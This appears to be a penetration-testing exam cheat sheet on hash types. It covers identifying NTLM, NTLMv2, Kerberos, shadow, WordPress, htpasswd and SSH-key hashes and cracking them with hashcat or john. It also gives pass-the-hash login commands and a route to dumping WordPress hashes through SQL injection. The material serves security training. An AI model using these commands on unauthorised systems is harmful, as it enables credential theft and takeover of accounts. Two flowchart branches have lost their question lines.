---
title: "Hash Types"
date: 2026-06-20
weight: 170
draft: false
summary: "Instant reference when you see a hash: identification, whether it can be cracked, and whether it can be passed."
---

Instant reference when you see a hash: identification, whether it can be cracked, and whether it can be passed.

- Source: https://heretek.dev/oscp-cheatsheet/hash-types/ (Jean Romero) — Reconstructed

## Quick Mode Reference

- NTLM (Windows SAM/secretsdump, 32 hex): `hashcat -m 1000` — pass-the-hash first, cracking optional
- NTLMv2 (Responder capture): `hashcat -m 5600` — must crack, cannot pass
- AS-REP (`$krb5asrep$23$` prefix): `hashcat -m 18200`
- Kerberoast TGS (`$krb5tgs$23$` prefix): `hashcat -m 13100`
- Linux shadow `$1$` / `$5$` / `$6$`: `hashcat -m 500` / `7400` / `1800`
- WordPress phpass (`$P$` prefix): `hashcat -m 400`
- Apache .htpasswd (`$apr1$` prefix): `hashcat -m 1600`
- MD5 (32 hex with no prefix): `hashcat -m 0`
- SHA1 (40 hex): `hashcat -m 100`
- SSH key passphrase: extract with ssh2john, then john (hashcat uses -m 22921)

## 1. NTLM Hash (Windows SAM / secretsdump)

secretsdump output gives you a line like this:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa3b347fb64a282e89bae4:::
```

Breaking it down:

```text
Administrator    = username
500              = RID (500 = built-in admin)
aad3b435...      = LM hash (empty/disabled — IGNORE this part)
32693b11e6aa...  = NTLM hash (THIS is what you want)
```

Can it be cracked? Yes:

```bash
# Extract just the NTLM part (after the second colon)
hashcat -m 1000 ntlm.hash rockyou.txt
```

Should you crack it? No — pass-the-hash is faster:

```bash
# Why waste time cracking when you can just USE the hash directly?
evil-winrm -i $ip -u Administrator -H '32693b11e6aa3b347fb64a282e89bae4'
impacket-psexec DOMAIN/Administrator@$ip -hashes :32693b11e6aa3b347fb64a282e89bae4
nxc smb $ip -u Administrator -H '32693b11e6aa3b347fb64a282e89bae4'
```

Lesson: an NTLM hash from secretsdump/SAM is like a master key. Windows accepts the hash directly for authentication even if you never learn the actual password. Cracking is optional — pass-the-hash works immediately.

When you do need to crack NTLM:

- When the machine only accepts passwords for RDP, not hashes
- When you want to spray the actual password against other services such as a web app

## 2. NTLMv2 Hash (Responder capture)

The form you capture while running Responder on the network:

```text
svc_backup::HTB:1122334455667788:AAF8B0B...long blob...:0101000000000000
```

Can it be cracked? Yes — you must crack it:

```bash
hashcat -m 5600 captured.hash rockyou.txt
```

Pass-the-hash? Not possible. NTLMv2 is a challenge-response hash tied to a specific session, so it cannot be used for PtH. You must crack it to get the plaintext password.

Difference from NTLM:

- NTLM (SAM dump) = stored hash. Reusable immediately.
- NTLMv2 (Responder) = one-time challenge-response. Must be cracked.

## 3. AS-REP Hash (AS-REP Roasting)

Output of impacket-GetNPUsers:

```text
$krb5asrep$23$svc-alfresco@HTB.LOCAL:7e52e82c669eac43e4f548297b9d772f$...long blob...
```

Identification: starts with `$krb5asrep$23$` — the unique AS-REP hash prefix.

How to crack:

```bash
hashcat -m 18200 asrep.hash rockyou.txt
# or
john asrep.hash --wordlist=rockyou.txt
```

Usable without cracking? No. Unlike NTLM, an AS-REP hash cannot be passed. You must crack it to get the plaintext password.

Why it exists: when "Do not require Kerberos pre-authentication" is enabled on an account, the DC hands you a blob encrypted with the user's password. Crack that blob to recover the password.

## 4. TGS Hash (Kerberoasting)

Output of impacket-GetUserSPNs:

```text
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$a1b2c3...long blob...
```

Identification: starts with `$krb5tgs$23$` — the unique Kerberoasting hash prefix.

How to crack:

```bash
hashcat -m 13100 kerberoast.hash rockyou.txt
# or
john kerberoast.hash --wordlist=rockyou.txt
```

Usable without cracking? No. As with AS-REP, you must crack it to obtain the plaintext password.

AS-REP vs TGS mnemonic:

```text
$krb5asrep$ = AS-REP Roasting = hashcat -m 18200 = no creds needed
$krb5tgs$   = Kerberoasting   = hashcat -m 13100 = creds needed
```

The hash prefix alone tells you which one it is.

## 5. Linux shadow Hash (/etc/shadow)

When you read /etc/shadow on a Linux box:

```text
root:$6$xyz123$LongHashStringHere...:19000:0:99999:7:::
```

Identification: `$6$` = SHA-512. The number after the first $ tells you the hash type:

```text
$1$ = MD5        → hashcat -m 500
$5$ = SHA-256    → hashcat -m 7400
$6$ = SHA-512    → hashcat -m 1800  (most common on modern Linux)
```

How to crack:

```bash
# Copy the full hash including $6$ and salt
echo '$6$xyz123$LongHashStringHere...' > shadow.hash
hashcat -m 1800 shadow.hash rockyou.txt
```

- shadow hashes crack slowly. Salted SHA-512 is intentionally designed to be slow. rockyou can take hours, so start with a smaller wordlist.

## 6. WordPress Hash (phpass)

Found in wp_users in a WordPress DB dump:

```text
admin:$P$BcDsN.F.MIGwMEFfZ3kG6IN0sTqGWs1
```

Identification: starts with `$P$` — unique to WordPress/phpass hashes.

How to crack:

```bash
hashcat -m 400 wp_hash.txt rockyou.txt
# or
john wp_hash.txt --wordlist=rockyou.txt
```

Ways to get a WordPress hash:

- SQL injection that dumps the wp_users table
- Direct MySQL access: SELECT user_login, user_pass FROM wp_users;
- Find wp-config.php → obtain DB creds → connect to MySQL → dump users

## 7. SSH Key Passphrase

You find an id_rsa private key protected by a password:

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25...
```

The "ENCRYPTED" marker means a passphrase is required.

How to crack:

```bash
# Step 1: Convert to crackable format
ssh2john id_rsa > ssh_hash.txt

# Step 2: Crack with john (preferred for SSH keys)
john ssh_hash.txt --wordlist=rockyou.txt
```

- Do not feed the raw id_rsa file to hashcat — hashcat only reads extracted hashes. With a raw key you get "Separator unmatched" on every line. If you really want hashcat: `hashcat -m 22921 ssh_hash.txt rockyou.txt` (use ssh2john output, not the raw key)

Use the key with the cracked passphrase:

```bash
chmod 600 id_rsa
ssh -i id_rsa user@target
# Enter passphrase when prompted
```

## 8. Apache .htpasswd

You find a .htpasswd file:

```text
admin:$apr1$salt$hashedpasswordhere
```

Identification: starts with `$apr1$` — unique to Apache htpasswd.

How to crack:

```bash
hashcat -m 1600 htpasswd.hash rockyou.txt
john htpasswd.hash --wordlist=rockyou.txt
```

## Hash Decision Flowchart

```text
Found a hash
    │
    ├── Is it an NTLM hash from SAM/secretsdump? (32 hex chars, from Windows)
    │     → TRY PASS-THE-HASH FIRST (evil-winrm -H, psexec -hashes)
    │     → Only crack if you need the actual password
    │
    ├── Is it from Responder/relay? (NTLMv2, long with ::)
    │     → MUST CRACK IT (hashcat -m 5600)
    │     → Cannot pass-the-hash with NTLMv2
    │
    │     → AS-REP hash → hashcat -m 18200
    │
    │     → Kerberoast hash → hashcat -m 13100
    │
    ├── Does it start with $6$ or $5$ or $1$?
    │     → Linux shadow → $6$=1800, $5$=7400, $1$=500
    │
    ├── Does it start with $P$?
    │     → WordPress → hashcat -m 400
    │
    ├── Does it start with $apr1$?
    │     → Apache htpasswd → hashcat -m 1600
    │
    ├── Is it a 32 character hex string with no prefix?
    │     → Probably MD5 → hashcat -m 0
    │
    ├── Is it a 40 character hex string?
    │     → Probably SHA1 → hashcat -m 100
    │
    └── Dont know?
          → Run: hashid 'paste_hash_here'
          → Or: hash-identifier
```
